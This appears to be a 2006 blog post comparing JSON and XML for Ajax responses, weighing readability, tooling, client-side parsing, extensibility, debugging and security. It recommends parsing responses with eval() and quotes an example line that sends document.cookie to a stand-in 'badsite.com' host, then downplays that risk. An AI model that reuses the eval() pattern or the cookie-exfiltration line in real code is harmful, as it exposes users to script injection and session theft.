@@ -1,0 +1,186 @@
+
+JSON vs XML
+
+What is the right response format for XMLHttpRequest in Ajax applications? The answer is simple for most markup-oriented applications - use HTML. For data-oriented applications the choice is between XML and JSON. Until recently I did not pay much attention to the question of whether to use XML or JSON. I just presumed that the use case at hand will dictate the format. I had a chance to test this presumption recently. In this post, I would like to describe the criteria I used for comparing between XML and JSON, and my analysis.
+
+Here is my criteria:
+
+    * Human readability
+    * Ease of creating the data on the server side
+    * Ease of processing the data on the client side
+    * Extensibility of the payload
+    * Debugging and trouble-shooting
+    * Security
+
+Human Readability
+
+Peter-Paul Kock of QuirksMode.org includes human-readability as one of the criteria in his analysis. IMO, human-readability is a secondary goal, and one could easily argue that JSON is as human-readable as XML - provided both are pretty-printed.
+view plaincopy to clipboardprint?
+
+   1. <person>  
+   2.   <firstname>Subbu</firstname>  
+   3.   <lastname>Allamaraju</lastname>  
+   4. </person>  
+
+
+  Subbu
+  Allamaraju
+
+	
+view plaincopy to clipboardprint?
+
+   1. ({   
+   2.   "firstName" : "Subbu",  
+   3.   "lastName" : "Allamaraju"  
+   4. });  
+
+({ 
+  "firstName" : "Subbu",
+  "lastName" : "Allamaraju"
+});
+
+I would argue that the ability to debug and trouble-shoot is more important than human-readability.
+Ease of Data Creation
+
+Given that XML has been around for years, there are a number of XML data-binding APIs to create XML in several progamming languages. In the Java-land, for instance, you could data-binding APIs like JAXB or XmlBeans to write XML response. Here is an example using JAXB.
+view plaincopy to clipboardprint?
+
+   1. Person person = new Person();  
+   2. person.setFirstName("Subbu");  
+   3. person.setLastName("Allamaraju");  
+   4. Marshaller marshaller = ... // Create a marshaller instance  
+   5. marshaller.marshal(person, outputStream);  
+
+  Person person = new Person();
+  person.setFirstName("Subbu");
+  person.setLastName("Allamaraju");
+  Marshaller marshaller = ... // Create a marshaller instance
+  marshaller.marshal(person, outputStream);
+
+On the otherhand, APIs to create JSON responses are fairly new. Nonetheless, JSON.org lists a fairly impressive collection of APIs in various languages. Here is an example of creating a response with Json-lib.
+view plaincopy to clipboardprint?
+
+   1. Person person = new Person();  
+   2. person.setFirstName("Subbu");  
+   3. person.setLastName("Allamaraju");  
+   4. writer.write(JSONObject.fromObject(person).toString());  
+
+  Person person = new Person();
+  person.setFirstName("Subbu");
+  person.setLastName("Allamaraju");
+  writer.write(JSONObject.fromObject(person).toString());
+
+JSON is not far behind in terms of APIs to serialize Java beans into objects. However, I must point out that there are far more ways to create XML than JSON. Some of those XML APIs have been around for years and hence may be more stable for complex applications.
+
+Another point to consider is what sources are being used to generate the response. If your backend is already doing the heavy-lifting to create data as XML, it will most likely be optimal to use XML as the response format. If not, I would not discount using JSON.
+Ease of Data Processing on the Client Side
+
+On the client-side, processing JSON data from the response of an XMLHttpRequest is trivial.
+
+   1. var person = eval(xhr.responseText);  
+   2. alert(person.firstName);  
+
+  var person = eval(xhr.responseText);
+  alert(person.firstName);
+
+With a simple eval(), you could evaluate the response to a JavaScript object. Once this step is done, to access the data, you just access the properties of the evaluated object. This is the most elegant part of JSON.
+
+Now consider XML. To keep the code snippet below short, I have excluded all error checks.
+view plaincopy to clipboardprint?
+
+   1. var xml = xhr.responseXML;   
+   2. var elements = xml.getElementsByTagName("firstName");  
+   3. alert(elements[0].firstChild.textContent);  
+
+  var xml = xhr.responseXML; 
+  var elements = xml.getElementsByTagName("firstName");
+  alert(elements[0].firstChild.textContent);
+
+Apparently, to process the response data, you need to walk the DOM tree. This is a very tedious exercise, and is error prone. Unfortunately, DOM is what we are left with on the browser side. Browsers don't support query languages like XPath to query and select nodes in an XML document. There is XSLT support, but it is limited to transforming XML into markup (e.g. HTML). W3C's Web API Working Group is working on a Selectors API that can be used to use CSS-style selectors to select nodes from a Document object. With this API, the above code snippet can be changed to xml.match("person.firstName") to get the firstName element. This is not a great improvement in this specific example XML document, but will be more useful to process deeply nested documents. This API is is work-in-progress, and is years away from browsers supporting this API.
+
+Between XML and JSON, I prefer JSON for ease of client side processing.
+Extensibility
+
+Extensibility helps reduce the coupling between the producer and the consumer of the data. In the context of Ajax applications, the client side script should be reasonably agnostic of compatible changes made to the data.
+
+It is a common presumption that, just because there is an "X" in XML, XML is automatically extensible. That is not necessarily the case (i.e. not automatic). The extensibility of XML is based on the principle that you can define extensibility points in your XML, and then honor the must-ignore rule (i.e. if you come across an unknown element/attribute while processing XML, just ignore it).
+
+To take advantage of extensibility, you need to write the processing code on the client side with extensibility in mind. For example, the following code would break when you insert, e.g., a middleName element.
+view plaincopy to clipboardprint?
+
+   1. var xml = xhr.responseXML;   
+   2. var elements = xml.getElementsByTagName("firstName");  
+   3. var firstNameEl = elements[0];  
+   4. var lastNameEl = firstNameEl.nextSibling;  
+
+  var xml = xhr.responseXML; 
+  var elements = xml.getElementsByTagName("firstName");
+  var firstNameEl = elements[0];
+  var lastNameEl = firstNameEl.nextSibling;
+
+When you insert a <middleName> element after the <firstName> element, the code above would incorrectly treat the middle name as last name. To be agnostic of this change, this code will have to be rewritten to either explicitly get the <lastName> element, or keep accessing nextSibling till the sibling with the correct tagName is found. So, XML is extensible as long as you write the processing code with extensibility in mind. There is no magic.
+
+How about JSON? I would argue that it is simpler to extend JSON data than XML. It certainly takes less effort. Consider adding a middleName property to the JSON response. To access it, you would simple access the property.
+
+   1. alert(person.middleName);  
+
+    alert(person.middleName);
+
+This code need not be changed if you insert a middle name. How about processing a person object with or without middle name? It is simple with JSON.
+view plaincopy to clipboardprint?
+
+   1. if(person.middleName) {  
+   2.   // Process   
+   3. }  
+
+  if(person.middleName) {
+    // Process 
+  }
+
+My take is that, provided extensibility is kept in mind, both XML and JSON can be extended. JSON is just much easier to deal with extensibility than XML. You just need to check if a given property exists on an object, and process accordingly.
+
+There is another kind of extensibility possible with JSON, that is to inject code along with the data into the response.
+view plaincopy to clipboardprint?
+
+   1. alert("Hi - I'm a person");  
+   2. ({"firstName" : "Subbu",   
+   3.   "lastName" : "Allamaraju"});  
+
+  alert("Hi - I'm a person");
+  ({"firstName" : "Subbu", 
+    "lastName" : "Allamaraju"});
+ 
+
+When this data is evaluated via eval(), the browser would also execute the alert() statement. This way, you can download and execute code. This approach needs to be used carefully as it pollutes the response and creates a coupling between the code and data. Some people also consider this technique a security risk - more about that below.
+Debugging and Trouble-shooting
+
+This aspect needs to be addressed on both the server side and the client side. On the server side, it is necessary to ensure that the data is well-formed and valid. On the client side, it should be easy to debug errors in the response.
+
+With XML, it is relatively easy to check that the data being sent to the client is well-formed and valid. You can use a schema for your data, and use that to validate the data. With JSON, this task is manual, and involves verifing that the response object has the right attributes.
+
+On the client side, it is difficult to spot errors in either format. With XML, the browser would simply fail to parse the XML into the responseXML. For small JSON data, I was able to detect errors with the FireBug extension in Firefox. With larger data, it may be a bit more difficult to relate the error messages to the data.
+Security
+
+Dave Johnson comments that JSON could pose security problems in his post JSON and the Golden Fleece. His comment is based on the fact that you can include script along with data in JSON responses, and by using eval() to process the response, you will also be executing the script, and that such a script may pose a security risk.
+view plaincopy to clipboardprint?
+
+   1. window.location = "http://badsite.com?" + document.cookie;  
+   2. person : {   
+   3.   "firstName" : "Subbu",  
+   4.   "lastName" : "Allamaraju"  
+   5. }  
+
+  window.location = "http://badsite.com?" + document.cookie;
+  person : { 
+    "firstName" : "Subbu",
+    "lastName" : "Allamaraju"
+  }
+
+The response above, when evaluated, will cause the browser to post the user's cookies to a rogue site. But there is a fallacy in the argument about the security risk. You should not trust data or code when it was returned from un untrusted source. Secondly, you can not use XMLHttpRequest to connect to domains other than the one you downloaded the script from. So, only the developer(s) in charge of building the application can post the cookies to a rogue site. This is a bit fictitious, since those developers can put the same code elsewhere in the document outside the data. So unless I'm missing something, I don't consider that JSON is insecure when compared to XML.
+My Conclusion
+
+For data-oriented applications, I prefer JSON to XML due to its simplicity and ease of processing on the client side. XML may be great on the server side, but JSON is definitely easier to deal with on the client side.
+
+
+
+http://www.subbu.org/weblogs/main/2006/08/json_vs_xml_1.html
